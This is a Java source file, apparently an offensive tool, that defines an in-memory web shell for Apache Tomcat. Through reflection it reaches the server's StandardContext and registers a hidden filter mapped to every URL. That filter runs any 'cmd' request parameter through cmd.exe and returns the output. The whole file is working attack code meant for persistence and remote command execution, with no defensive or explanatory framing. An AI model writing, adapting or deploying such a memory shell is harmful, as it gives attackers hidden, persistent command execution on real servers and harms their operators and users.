package org.example.MemShell;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;

public class MaliciousClass {

    public static void addfilter1(HttpServletRequest request, HttpServletResponse response) throws NoSuchFieldException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {

        final String name = "n1ntyfilter";

        System.out.println("==============================\nAddFilter memshell executed");
// System.out.println("THIS MEMSHELL class loader: " + Thread.currentThread().getContextClassLoader());

        ServletContext ctx = request.getSession().getServletContext();
        Field f = ctx.getClass().getDeclaredField("context");
        f.setAccessible(true);
        ApplicationContext appCtx = (ApplicationContext) f.get(ctx);

        f = appCtx.getClass().getDeclaredField("context");
        f.setAccessible(true);
        StandardContext standardCtx = (StandardContext) f.get(appCtx);


        f = standardCtx.getClass().getDeclaredField("filterConfigs");
        f.setAccessible(true);
        Map filterConfigs = (Map) f.get(standardCtx);

        if (filterConfigs.get(name) == null) {
            response.getWriter().println("inject " + name);

            Filter filter = new Filter() {
                @Override
                public void init(FilterConfig arg0) throws ServletException {
                    // TODO Auto-generated method stub
                }

                @Override
                public void doFilter(ServletRequest arg0, ServletResponse arg1, FilterChain arg2)
                        throws IOException, ServletException {
                    // TODO Auto-generated method stub
                    HttpServletRequest req = (HttpServletRequest) arg0;
                    if (req.getParameter("cmd") != null) {
                        byte[] data = new byte[1024];
                        Process p = new ProcessBuilder("cmd.exe", "/c", req.getParameter("cmd")).start();
                        int len = p.getInputStream().read(data);
                        p.destroy();
                        arg1.getWriter().write(new String(data, 0, len));
                        return;
                    }
                    arg2.doFilter(arg0, arg1);
                }

                @Override
                public void destroy() {
                    // TODO Auto-generated method stub
                }
            };

            FilterDef filterDef = new FilterDef() {
                @Override
                public void setFilterName(String name) {

                    // Call the original method's logic
                    super.setFilterName(name);
                }
            };
            filterDef.setFilterName(name);

            filterDef.setFilterClass(filter.getClass().getName());
            filterDef.setFilter(filter);
            standardCtx.addFilterDef(filterDef);

            FilterMap m = new FilterMap();
            m.setFilterName(filterDef.getFilterName());
            m.setDispatcher(DispatcherType.REQUEST.name());
            m.addURLPattern("/*");
            standardCtx.addFilterMapBefore(m);
            Constructor<ApplicationFilterConfig> constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            FilterConfig filterConfig = (FilterConfig) constructor.newInstance(standardCtx, filterDef);
            filterConfigs.put(name, filterConfig);
            response.getWriter().println("Filter injected");
        }

    }




}
